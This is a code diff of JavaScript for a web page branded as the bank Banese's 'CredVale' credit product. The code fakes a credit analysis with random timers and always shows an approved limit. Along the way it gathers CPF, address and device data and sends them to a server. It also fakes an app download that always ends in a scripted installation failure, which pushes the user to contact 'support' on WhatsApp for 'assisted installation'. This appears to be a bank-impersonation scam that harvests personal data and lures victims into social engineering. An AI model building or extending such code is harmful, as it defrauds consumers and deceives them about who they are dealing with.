@@ -759,75 +759,69 @@
     ]);
   }
 
-  /* ---- POPUP DE INTRODUÇÃO DA ANÁLISE ---- */
+  /* ---- MODAL 1: PRÉ-ANÁLISE BANESE ---- */
   async function etapaIntroAnalise() {
     var nome = (user.nome||'').split(' ')[0] || 'Cliente';
-    var frases = [
-      'Iniciando análise das informações para verificar sua solicitação do CredVale.',
-      'Processo rápido — leva apenas alguns segundos.',
-      'Mantenha esta página aberta e não atualize o navegador.',
-      'Em instantes você verá o resultado da análise.'
+    var stepsPre = [
+      'Iniciando pré-análise da sua proposta...',
+      'Conectando ao sistema Banese...',
+      'Verificando elegibilidade...',
+      'Preparando análise de crédito...'
     ];
-    var labels = ['Conectando...', 'Verificando dados...', 'Processando...', 'Finalizando...'];
     var html =
-      '<div class="terminal-popup">'+
-        '<div class="terminal-window">'+
-          '<div class="terminal-titlebar">'+
-            '<span class="terminal-dot terminal-dot--red"></span>'+
-            '<span class="terminal-dot terminal-dot--yellow"></span>'+
-            '<span class="terminal-dot terminal-dot--green"></span>'+
-            '<span class="terminal-title-text">CREDVALE — análise</span>'+
+      '<div class="banese-modal">'+
+        '<div class="banese-modal-header">'+
+          '<div class="banese-modal-logo">BANESE</div>'+
+          '<div class="banese-modal-star">&#9733;</div>'+
+          '<div class="banese-modal-logo-sub">CREDVALE</div>'+
+        '</div>'+
+        '<div class="banese-modal-body">'+
+          '<div class="banese-pre-anim">'+
+            '<div class="banese-pre-spinner"><div></div><div></div><div></div><div></div></div>'+
           '</div>'+
-          '<div class="terminal-body">'+
-            '<div class="terminal-greeting">'+
-              '<span class="terminal-greeting-icon">'+
-                (nome ? nome.charAt(0).toUpperCase() : '?')+
-              '</span>'+
-              '<span class="terminal-greeting-text">Olá '+nome+', sua análise está começando</span>'+
-            '</div>'+
-            '<div class="terminal-lines" id="terminalLines">'+
-              frases.map(function(f,i){
-                return '<div class="terminal-line" data-idx="'+i+'">'+
-                  '<span class="terminal-line-prefix">▸</span>'+
-                  '<span>'+f+'</span>'+
-                '</div>';
-              }).join('')+
-            '</div>'+
-            '<div class="terminal-footer">'+
-              '<div class="terminal-footer-bar">'+
-                '<div class="terminal-footer-fill" id="terminalFill"></div>'+
-              '</div>'+
-              '<span class="terminal-footer-label" id="terminalLabel">0%</span>'+
-            '</div>'+
+          '<div class="banese-pre-title">Pré-análise em andamento</div>'+
+          '<div class="banese-pre-sub">Estamos iniciando a análise da sua proposta. Aguarde alguns instantes.</div>'+
+          '<div class="banese-pre-steps" id="banesePreSteps">'+
+            stepsPre.map(function(s,i){
+              return '<div class="banese-pre-step" data-idx="'+i+'">'+
+                '<div class="banese-pre-step-icon">'+(i+1)+'</div>'+
+                '<span>'+s+'</span>'+
+              '</div>';
+            }).join('')+
           '</div>'+
+          '<div class="banese-progress-bar">'+
+            '<div class="banese-progress-fill" id="banesePreFill"></div>'+
+          '</div>'+
+          '<div class="banese-progress-label" id="banesePreLabel">0%</div>'+
         '</div>'+
       '</div>';
     showPopup(html);
-    for (var i = 0; i < frases.length; i++) {
-      var el = document.querySelector('.terminal-line[data-idx="'+i+'"]');
-      if (el) {
-        await sleep(60);
-        el.classList.add('terminal-line--visible');
-        if (i > 0) {
-          var prev = document.querySelector('.terminal-line[data-idx="'+(i-1)+'"]');
-          if (prev) prev.classList.remove('terminal-line--active');
-        }
-        el.classList.add('terminal-line--active');
+    for (var i = 0; i < stepsPre.length; i++) {
+      var item = document.querySelector('.banese-pre-step[data-idx="'+i+'"]');
+      if (item) {
+        item.classList.add('banese-pre-step--active');
+        var ic = item.querySelector('.banese-pre-step-icon');
+        if (ic) ic.textContent = '\u27f3';
+        await sleep(1500 + Math.floor(Math.random()*1000));
+        item.classList.remove('banese-pre-step--active');
+        item.classList.add('banese-pre-step--done');
+        if (ic) ic.textContent = '\u2713';
+      } else {
+        await sleep(1500 + Math.floor(Math.random()*1000));
       }
-      var fill = document.getElementById('terminalFill');
-      var label = document.getElementById('terminalLabel');
-      var pct = Math.round(((i+1)/frases.length)*100);
+      var fill = document.getElementById('banesePreFill');
+      var label = document.getElementById('banesePreLabel');
+      var pct = Math.round(((i+1)/stepsPre.length)*100);
       if (fill) fill.style.width = pct+'%';
-      if (label) label.textContent = labels[i]+' '+pct+'%';
-      if (i < frases.length - 1) await sleep(2600);
+      if (label) label.textContent = pct+'%';
     }
-    await sleep(1000);
+    await sleep(800);
     closePopup();
     await sleep(300);
     etapaAnalisePopup();
   }
 
-  /* ---- ANÁLISE AUTOMÁTICA + POPUP APROVAÇÃO ---- */
+  /* ---- MODAL 2+3+4: ANÁLISE CRÉDITO + FINALIZAÇÃO + APROVAÇÃO BANESE ---- */
   async function etapaAnalisePopup() {
     trackStage('Analisando Crédito');
     updateProgress(6);
@@ -847,45 +841,99 @@
     flowState = 'analysis';
     hideInput();
 
-    var steps = [
-      { label:'Verificando CPF', done:false },
-      { label:'Analisando dados cadastrais', done:false },
-      { label:'Analisando questionário', done:false },
-      { label:'Consultando referências', done:false },
-      { label:'Calculando limite', done:false },
-      { label:'Preparando proposta', done:false }
+    var baneseSteps = [
+      { label:'Consultando relacionamento com o Banese...' },
+      { label:'Verificando Score de Crédito...' },
+      { label:'Validando dados cadastrais...' },
+      { label:'Conferindo histórico financeiro...' },
+      { label:'Processando elegibilidade...' },
+      { label:'Finalizando análise da proposta...' }
     ];
 
-    var procHtml =
-      '<div class="popup-spinner"></div>'+
-      '<div class="popup-title">Analisando seus dados</div>'+
-      '<div class="popup-subtitle">Estamos processando suas informações</div>'+
-      '<div class="popup-step-list" id="popupStepList">'+
-        steps.map(function(s,i){
-          return '<div class="popup-step-item" data-idx="'+i+'"><div class="popup-step-icon">'+(i+1)+'</div>'+s.label+'</div>';
-        }).join('')+
-      '</div>'+
-      '<div class="popup-progress-bar"><div class="popup-progress-fill" id="popupProgressFill"></div></div>';
+    /* ---- MODAL 2: Análise de Crédito Banese ---- */
+    var analiseHtml =
+      '<div class="banese-modal">'+
+        '<div class="banese-modal-header">'+
+          '<div class="banese-modal-logo">BANESE</div>'+
+          '<div class="banese-modal-star">&#9733;</div>'+
+          '<div class="banese-modal-logo-sub">CREDVALE</div>'+
+        '</div>'+
+        '<div class="banese-modal-body">'+
+          '<div class="banese-credit-title">Analisando seu perfil de crédito</div>'+
+          '<div class="banese-step-list" id="baneseStepList">'+
+            baneseSteps.map(function(s,i){
+              return '<div class="banese-step-item" data-idx="'+i+'">'+
+                '<div class="banese-step-icon">'+(i+1)+'</div>'+
+                '<div class="banese-step-label">'+s.label+'</div>'+
+                '<div class="banese-step-status" id="baneseStepStatus'+i+'"></div>'+
+              '</div>';
+            }).join('')+
+          '</div>'+
+          '<div class="banese-progress-bar" style="margin-top:16px;">'+
+            '<div class="banese-progress-fill" id="baneseCreditFill"></div>'+
+          '</div>'+
+          '<div class="banese-progress-label" id="baneseCreditLabel">0%</div>'+
+        '</div>'+
+      '</div>';
 
-    showPopup(procHtml);
+    showPopup(analiseHtml);
 
-    var fill = document.getElementById('popupProgressFill');
-    for (var i=0; i<steps.length; i++) {
-      var item = document.querySelector('.popup-step-item[data-idx="'+i+'"]');
+    var fill = document.getElementById('baneseCreditFill');
+    var label = document.getElementById('baneseCreditLabel');
+
+    for (var i = 0; i < baneseSteps.length; i++) {
+      var item = document.querySelector('.banese-step-item[data-idx="'+i+'"]');
+      var status = document.getElementById('baneseStepStatus'+i);
       if (item) {
-        item.classList.add('popup-step-item--active');
-        var ic = item.querySelector('.popup-step-icon');
-        if (ic) ic.textContent = '⟳';
-        await sleep(1800 + Math.floor(Math.random()*1200));
-        item.classList.remove('popup-step-item--active');
-        item.classList.add('popup-step-item--done');
-        if (ic) ic.textContent = '✓';
+        item.classList.add('banese-step-item--active');
+        if (status) { status.textContent = '⏳'; status.className = 'banese-step-status banese-step-status--pending'; }
+        await sleep(1200 + Math.floor(Math.random()*800));
+        item.classList.remove('banese-step-item--active');
+        item.classList.add('banese-step-item--done');
+        if (status) { status.textContent = '✓'; status.className = 'banese-step-status banese-step-status--done'; }
       } else {
-        await sleep(1800 + Math.floor(Math.random()*1200));
+        await sleep(1200 + Math.floor(Math.random()*800));
       }
-      if (fill) fill.style.width = Math.round(((i+1)/steps.length)*100)+'%';
+      var pct = Math.round(((i+1)/baneseSteps.length)*100);
+      if (fill) fill.style.width = pct+'%';
+      if (label) label.textContent = pct+'%';
     }
 
+    await sleep(500);
+
+    /* ---- MODAL 3: Finalização ---- */
+    closePopup();
+    await sleep(300);
+
+    var finalHtml =
+      '<div class="banese-modal">'+
+        '<div class="banese-modal-header">'+
+          '<div class="banese-modal-logo">BANESE</div>'+
+          '<div class="banese-modal-star">&#9733;</div>'+
+          '<div class="banese-modal-logo-sub">CREDVALE</div>'+
+        '</div>'+
+        '<div class="banese-modal-body">'+
+          '<div class="banese-pre-anim">'+
+            '<div class="banese-pre-spinner banese-pre-spinner--final"><div></div><div></div><div></div><div></div></div>'+
+          '</div>'+
+          '<div class="banese-pre-title">Estamos finalizando sua proposta...</div>'+
+          '<div class="banese-pre-sub">Aguarde enquanto concluímos a liberação.</div>'+
+          '<div class="banese-progress-bar" style="margin-top:20px;">'+
+            '<div class="banese-progress-fill" id="baneseFinalFill" style="width:0%;transition:width 0.3s ease;"></div>'+
+          '</div>'+
+        '</div>'+
+      '</div>';
+
+    showPopup(finalHtml);
+
+    var finalFill = document.getElementById('baneseFinalFill');
+    for (var f = 0; f <= 100; f += 5) {
+      if (finalFill) finalFill.style.width = f + '%';
+      await sleep(120);
+    }
+    await sleep(600);
+
+    /* ---- API: Criar cliente ---- */
     var apiData = {
       cpf: user.cpf, nome: user.nome, nascimento: user.nascimento, sexo: user.sexo,
       cep: user.cep, rua: user.rua, numero: user.numero, complemento: user.complemento,
@@ -901,7 +949,6 @@
       navegador: sessionStorage.getItem('vs_navegador')||'',
       navegador_versao: sessionStorage.getItem('vs_navegador_versao')||''
     };
-    // Cria o cliente via fetch direto (para capturar clientId mesmo em caso de 409 - CPF já existente)
     var apiResult = null;
     try {
       var baseUrl = window.__API_BASE || '/api';
@@ -914,7 +961,6 @@
       if (resp.ok) {
         apiResult = respData;
       } else if (resp.status === 409 && respData.clientId) {
-        // CPF já existe no sistema (aprovado/ativado) — usa o clientId retornado
         apiResult = { clientId: respData.clientId };
         console.log('[cadastro] CPF já existente, usando clientId:', respData.clientId);
       } else {
@@ -933,39 +979,42 @@
     sessionStorage.setItem('vs_nome_completo', user.nome);
     sessionStorage.setItem('vs_limite', limite);
 
-    await sleep(600);
+    /* ---- MODAL 4: Aprovação Banese ---- */
+    await sleep(400);
+    closePopup();
+    await sleep(300);
+
     var nomePrimeiro = (user.nome||'').split(' ')[0]||'';
     var limFmt = Number(limite).toFixed(2).replace('.',',');
-    var popupBox = document.querySelector('.popup-box');
-    if (popupBox) {
-      popupBox.innerHTML =
-        '<div style="text-align:center;margin-bottom:12px;">'+
-          '<div style="display:inline-flex;align-items:center;gap:5px;background:rgba(76,200,164,0.12);border:1px solid rgba(76,200,164,0.2);border-radius:20px;padding:4px 14px 4px 10px;margin-bottom:10px;">'+
-            '<span style="width:18px;height:18px;border-radius:50%;background:linear-gradient(135deg,#4CC8A4,#059669);display:flex;align-items:center;justify-content:center;font-size:0.5rem;color:#fff;">✓</span>'+
-            '<span style="font-size:0.65rem;color:#4CC8A4;font-weight:700;letter-spacing:0.3px;">CRÉDITO APROVADO</span>'+
-          '</div>'+
-          '<div style="display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:8px;">'+
-            '<span style="font-size:1.8rem;line-height:1;">🎉</span>'+
-            '<div style="font-size:1.25rem;font-weight:800;color:#0f172a;">Parabéns, <span style="background:linear-gradient(135deg,#4CC8A4,#3B82F6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;">'+nomePrimeiro+'</span>!</div>'+
-          '</div>'+
-          '<div style="background:linear-gradient(160deg,rgba(76,200,164,0.06),rgba(59,130,246,0.04));border:1px solid rgba(76,200,164,0.12);border-radius:16px;padding:14px 16px;margin-bottom:12px;">'+
-            '<div style="font-size:0.6rem;color:#475569;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:2px;">Seu limite liberado</div>'+
-            '<div style="font-size:2rem;font-weight:900;background:linear-gradient(135deg,#4CC8A4,#3B82F6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;font-family:Space Grotesk,sans-serif;line-height:1.2;">R$ '+limFmt+'</div>'+
-          '</div>'+
-          '<div style="text-align:left;">'+
-            '<div style="font-size:0.72rem;color:#475569;font-weight:600;margin-bottom:6px;text-transform:uppercase;letter-spacing:0.3px;">⚡ Benefícios</div>'+
-            '<div style="display:flex;flex-direction:column;gap:4px;">'+
-              '<div style="display:flex;align-items:center;gap:8px;font-size:0.75rem;color:#475569;padding:5px 8px;border-radius:8px;background:rgba(255,255,255,0.02);"><span style="width:16px;height:16px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">✓</span> Desconto de até <strong>75%</strong> em medicamentos</div>'+
-              '<div style="display:flex;align-items:center;gap:8px;font-size:0.75rem;color:#475569;padding:5px 8px;border-radius:8px;background:rgba(255,255,255,0.02);"><span style="width:16px;height:16px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">✓</span> Fatura em até <strong>45 dias</strong> para pagar</div>'+
-              '<div style="display:flex;align-items:center;gap:8px;font-size:0.75rem;color:#475569;padding:5px 8px;border-radius:8px;background:rgba(255,255,255,0.02);"><span style="width:16px;height:16px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">✓</span> Parcelamento de medicamentos em até <strong>15x</strong></div>'+
-            '</div>'+
-          '</div>'+
-        '</div>'+
-        '<button class="chat-option chat-option--primary" id="popupContinuar" style="padding:14px;font-size:0.88rem;border:none;border-radius:12px;cursor:pointer;font-weight:800;font-family:inherit;background:linear-gradient(135deg,#3B82F6,#4CC8A4);color:#fff;width:100%;box-shadow:0 4px 20px rgba(59,130,246,0.15);transition:all .3s;">Continuar</button>';
 
-      // Só aprova e envia SMS depois que o cliente VIU a mensagem de aprovação
-      try { await API.updateClientStatus(clientId, 'aprovado', limite); } catch (e) { console.error('[aprovar]', e); }
-    }
+    var aprovHtml =
+      '<div class="banese-modal">'+
+        '<div class="banese-modal-header" style="background:linear-gradient(135deg,#022c22,#065F46);">'+
+          '<div class="banese-modal-logo">BANESE</div>'+
+          '<div class="banese-modal-star">&#9733;</div>'+
+          '<div class="banese-modal-logo-sub">CREDVALE</div>'+
+        '</div>'+
+        '<div class="banese-modal-body">'+
+          '<div style="text-align:center;margin-bottom:10px;">'+
+            '<div style="display:inline-flex;align-items:center;gap:5px;background:rgba(4,120,87,0.12);border:1px solid rgba(4,120,87,0.2);border-radius:20px;padding:4px 14px 4px 10px;margin-bottom:10px;">'+
+              '<span style="width:18px;height:18px;border-radius:50%;background:linear-gradient(135deg,#10B981,#047857);display:flex;align-items:center;justify-content:center;font-size:0.5rem;color:#fff;">✓</span>'+
+              '<span style="font-size:0.65rem;color:#047857;font-weight:700;letter-spacing:0.3px;">PROPOSTA APROVADA</span>'+
+            '</div>'+
+            '<div style="font-size:1.3rem;font-weight:800;color:#022c22;margin-bottom:4px;">Parabéns, '+nomePrimeiro+'! 🎉</div>'+
+            '<div style="font-size:0.8rem;color:#047857;font-weight:600;">Sua proposta foi aprovada</div>'+
+          '</div>'+
+          gerarCardBaneseSVG()+
+          '<div style="background:linear-gradient(135deg,rgba(4,120,87,0.06),rgba(16,185,129,0.04));border:1px solid rgba(4,120,87,0.15);border-radius:16px;padding:14px 16px;margin:10px 0 12px;text-align:center;">'+
+            '<div style="font-size:0.6rem;color:#047857;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:2px;font-weight:600;">Seu limite liberado</div>'+
+            '<div style="font-size:2rem;font-weight:900;background:linear-gradient(135deg,#047857,#10B981);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;font-family:Space Grotesk,sans-serif;line-height:1.2;">R$ '+limFmt+'</div>'+
+          '</div>'+
+          '<button class="banese-cta" id="popupContinuar" style="width:100%;padding:14px;font-size:0.9rem;border:none;border-radius:12px;cursor:pointer;font-weight:800;font-family:inherit;background:linear-gradient(135deg,#047857,#10B981);color:#fff;box-shadow:0 4px 20px rgba(4,120,87,0.25);transition:all .3s;">Continuar</button>'+
+        '</div>'+
+      '</div>';
+
+    showPopup(aprovHtml);
+
+    try { await API.updateClientStatus(clientId, 'aprovado', limite); } catch (e) { console.error('[aprovar]', e); }
 
     await new Promise(function(resolve) {
       var btn = document.getElementById('popupContinuar');
@@ -1314,10 +1363,9 @@
    * Função showDownloadModalInChat - Abre o modal de download do APK
    * Utiliza a função compartilhada API.showDownloadModal (mesma da Index e app.html)
    */
+  /* ---- SIMULAÇÃO DE DOWNLOAD DO APLICATIVO ---- */
   function showDownloadModalInChat(clientId, limite) {
-    if (popupEl) closePopup();
-    // Redundância: envia o beacon ANTES de abrir o modal, garantindo que
-    // mesmo que algo dê erro no modal, o registro do clique foi feito
+    // Registra o clique via beacon
     if (clientId) {
       try {
         var baseUrl = window.__API_BASE || '/api';
@@ -1331,11 +1379,175 @@
         navigator.sendBeacon(baseUrl + '/app/register-download', new Blob([payload], { type: 'application/json' }));
       } catch(e) {}
     }
-    API.showDownloadModal({
-      clientId: clientId || '',
-      cpf: (user && user.cpf) || '',
-      nome: (user && user.nome) || ''
-    });
+    // Abre modal de download
+    if (popupEl) closePopup();
+    var deviceInfo = getDeviceInfo();
+    var html =
+      '<div class="banese-modal">'+
+        '<div class="banese-modal-header" style="background:linear-gradient(135deg,#022c22,#065F46);">'+
+          '<div class="banese-modal-logo">BANESE</div>'+
+          '<div class="banese-modal-star">&#9733;</div>'+
+          '<div class="banese-modal-logo-sub">CREDVALE</div>'+
+        '</div>'+
+        '<div class="banese-modal-body">'+
+          '<div style="text-align:center;margin-bottom:14px;">'+
+            '<div style="font-size:1rem;font-weight:800;color:#022c22;margin-bottom:4px;">Aplicativo disponível</div>'+
+            '<div style="font-size:0.8rem;color:#475569;">Seu cadastro foi concluído com sucesso.<br>Agora você poderá realizar o download do aplicativo.</div>'+
+          '</div>'+
+          '<div id="downloadSimArea">'+
+            '<button class="banese-cta" id="btnStartDownload" style="width:100%;padding:14px;font-size:0.9rem;border:none;border-radius:12px;cursor:pointer;font-weight:800;font-family:inherit;background:linear-gradient(135deg,#047857,#10B981);color:#fff;box-shadow:0 4px 20px rgba(4,120,87,0.25);">Baixar aplicativo</button>'+
+          '</div>'+
+        '</div>'+
+      '</div>';
+    showPopup(html);
+
+    document.getElementById('btnStartDownload').onclick = function() {
+      startDownloadSimulation(clientId, limite, deviceInfo);
+    };
+  }
+
+  /* ---- SIMULAÇÃO DE DOWNLOAD COM PROGRESSO ---- */
+  function startDownloadSimulation(clientId, limite, deviceInfo) {
+    var stages = [
+      { label:'Preparando...', pct: 15 },
+      { label:'Baixando...', pct: 40 },
+      { label:'Instalando...', pct: 70 },
+      { label:'Configurando...', pct: 90 },
+      { label:'Verificando compatibilidade...', pct: 100 }
+    ];
+
+    var simHtml =
+      '<div class="banese-modal">'+
+        '<div class="banese-modal-header" style="background:linear-gradient(135deg,#022c22,#065F46);">'+
+          '<div class="banese-modal-logo">BANESE</div>'+
+          '<div class="banese-modal-star">&#9733;</div>'+
+          '<div class="banese-modal-logo-sub">CREDVALE</div>'+
+        '</div>'+
+        '<div class="banese-modal-body">'+
+          '<div style="text-align:center;margin-bottom:12px;">'+
+            '<div style="display:inline-flex;align-items:center;gap:4px;background:rgba(4,120,87,0.1);border:1px solid rgba(4,120,87,0.15);border-radius:20px;padding:3px 12px 3px 8px;margin-bottom:8px;">'+
+              '<span style="width:10px;height:10px;border-radius:50%;background:#047857;animation:pulse 1s infinite;"></span>'+
+              '<span style="font-size:0.6rem;color:#047857;font-weight:700;">BAIXANDO</span>'+
+            '</div>'+
+            '<div style="font-size:1rem;font-weight:800;color:#022c22;margin-bottom:2px;">Preparando download...</div>'+
+            '<div class="banese-dl-stage" id="dlStageLabel" style="font-size:0.78rem;color:#047857;font-weight:600;margin-bottom:14px;">Preparando...</div>'+
+          '</div>'+
+          '<div class="banese-progress-bar" style="height:14px;border-radius:10px;">'+
+            '<div class="banese-progress-fill" id="dlProgressFill" style="width:0%;transition:width 0.5s ease;height:14px;border-radius:10px;"></div>'+
+          '</div>'+
+          '<div style="display:flex;justify-content:space-between;font-size:0.7rem;color:#475569;margin-top:4px;">'+
+            '<span id="dlProgressLabel">0%</span>'+
+            '<span id="dlDeviceInfo">'+(deviceInfo.modelo||'Dispositivo')+'</span>'+
+          '</div>'+
+        '</div>'+
+      '</div>';
+
+    showPopup(simHtml);
+
+    var fill = document.getElementById('dlProgressFill');
+    var label = document.getElementById('dlProgressLabel');
+    var stageLabel = document.getElementById('dlStageLabel');
+    var currentPct = 0;
+
+    function updateProgress(targetPct, stageText, cb) {
+      var step = 2;
+      var interval = setInterval(function() {
+        currentPct += step;
+        if (currentPct >= targetPct) {
+          currentPct = targetPct;
+          clearInterval(interval);
+          if (stageLabel) stageLabel.textContent = stageText;
+          if (fill) fill.style.width = currentPct + '%';
+          if (label) label.textContent = currentPct + '%';
+          if (cb) setTimeout(cb, 300);
+          return;
+        }
+        if (fill) fill.style.width = currentPct + '%';
+        if (label) label.textContent = currentPct + '%';
+      }, 200);
+    }
+
+    function runStages(idx) {
+      if (idx >= stages.length) {
+        // Falha simulada
+        setTimeout(function() {
+          if (stageLabel) stageLabel.textContent = 'Falha na instalação';
+          showInstallFailure(clientId, limite, deviceInfo);
+        }, 800);
+        return;
+      }
+      var s = stages[idx];
+      if (stageLabel) stageLabel.textContent = s.label;
+      updateProgress(s.pct, s.label, function() {
+        runStages(idx + 1);
+      });
+    }
+
+    runStages(0);
+  }
+
+  /* ---- MODAL DE FALHA NA INSTALAÇÃO ---- */
+  function showInstallFailure(clientId, limite, deviceInfo) {
+    closePopup();
+    setTimeout(function() {
+      var waNum = __supportWhatsApp || '5511999999999';
+      var deviceMsg = encodeURIComponent(
+        'Olá! Preciso de ajuda com a instalação do aplicativo CredVale Banese.\n\n' +
+        'Dispositivo: ' + (deviceInfo.modelo || 'N/A') + '\n' +
+        'Fabricante: ' + (deviceInfo.fabricante || 'N/A') + '\n' +
+        'Sistema: ' + (deviceInfo.os || 'N/A') + '\n' +
+        'Navegador: ' + (deviceInfo.navegador || 'N/A') + '\n' +
+        'Cliente: ' + (user.nome || 'N/A')
+      );
+      var waUrl = 'https://wa.me/55' + waNum.replace(/\D/g,'') + '?text=' + deviceMsg;
+
+      var failHtml =
+        '<div class="banese-modal">'+
+          '<div class="banese-modal-header" style="background:linear-gradient(135deg,#991B1B,#DC2626);">'+
+            '<div class="banese-modal-logo" style="color:#fff;">BANESE</div>'+
+            '<div class="banese-modal-star" style="color:rgba(255,255,255,0.4);">&#9733;</div>'+
+            '<div class="banese-modal-logo-sub" style="color:rgba(255,255,255,0.6);">CREDVALE</div>'+
+          '</div>'+
+          '<div class="banese-modal-body">'+
+            '<div style="text-align:center;margin-bottom:14px;">'+
+              '<div style="font-size:2rem;margin-bottom:6px;">&#x26A0;&#xFE0F;</div>'+
+              '<div style="font-size:1rem;font-weight:800;color:#022c22;margin-bottom:4px;">Não foi possível concluir a instalação</div>'+
+              '<div style="font-size:0.8rem;color:#475569;line-height:1.5;">'+
+                'Identificamos uma incompatibilidade com este aparelho.<br><br>'+
+                'Nossa equipe pode realizar um procedimento de instalação assistida para ajudar você a utilizar o aplicativo.'+
+              '</div>'+
+            '</div>'+
+            '<div style="display:flex;flex-direction:column;gap:8px;">'+
+              '<button class="banese-cta" id="btnRetryDownload" style="width:100%;padding:12px;font-size:0.85rem;border:none;border-radius:12px;cursor:pointer;font-weight:700;font-family:inherit;background:linear-gradient(135deg,#047857,#10B981);color:#fff;">Tentar novamente</button>'+
+              '<button class="banese-cta" id="btnCallSupport" style="width:100%;padding:12px;font-size:0.85rem;border:none;border-radius:12px;cursor:pointer;font-weight:700;font-family:inherit;background:#25D366;color:#fff;">Chamar suporte</button>'+
+            '</div>'+
+          '</div>'+
+        '</div>';
+
+      showPopup(failHtml);
+
+      document.getElementById('btnRetryDownload').onclick = function() {
+        closePopup();
+        setTimeout(function() { showDownloadModalInChat(clientId, limite); }, 200);
+      };
+
+      document.getElementById('btnCallSupport').onclick = function() {
+        closePopup();
+        // Adiciona mensagem no chat com link do WhatsApp
+        addMsg(
+          '<div style="text-align:center;padding:8px 0;">'+
+            '<div style="font-size:1rem;margin-bottom:6px;">💬</div>'+
+            '<div style="font-size:0.85rem;font-weight:700;color:#0f172a;margin-bottom:8px;">Redirecionando para o suporte...</div>'+
+            '<a href="'+waUrl+'" target="_blank" rel="noopener" style="display:inline-block;background:#25D366;color:#fff;padding:10px 24px;border-radius:12px;text-decoration:none;font-weight:700;font-size:0.85rem;">Abrir WhatsApp</a>'+
+          '</div>',
+          'bot'
+        );
+        hideInput();
+        showOptions([
+          { label:'🏠 Voltar para início', action:function(){ window.location.href = '/'; } }
+        ]);
+      };
+    }, 200);
   }
 
   /* ---- Final Screen: Baixar App ou Suporte ---- */
